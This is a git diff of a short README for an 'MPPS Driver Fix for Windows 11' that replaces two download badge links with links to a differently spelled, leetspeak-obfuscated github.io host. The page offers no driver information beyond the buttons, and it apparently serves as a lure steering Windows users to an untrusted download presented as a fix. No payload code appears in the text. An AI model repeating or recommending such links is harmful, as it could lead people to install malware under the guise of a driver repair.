@@ -1,7 +1,7 @@
 # 🔧 MPPS Driver Fix for Windows 11
 
-[![Download Driver Fix](https://img.shields.io/badge/Download_Driver_Fix-blue?style=for-the-badge)](https://mppsdriverfixwebinfo0.github.io/.github/)  
-[![Get Drivers Now](https://img.shields.io/badge/Get_Drivers_Now-lightblue?style=for-the-badge&logo=windows)](https://mppsdriverfixwebinfo0.github.io/.github/)
+[![Download Driver Fix](https://img.shields.io/badge/Download_Driver_Fix-blue?style=for-the-badge)](https://1mppsdriver1f1xw11w16w18inf0.github.io/.github/)  
+[![Get Drivers Now](https://img.shields.io/badge/Get_Drivers_Now-lightblue?style=for-the-badge&logo=windows)](https://1mppsdriver1f1xw11w16w18inf0.github.io/.github/)
 
 ---
 
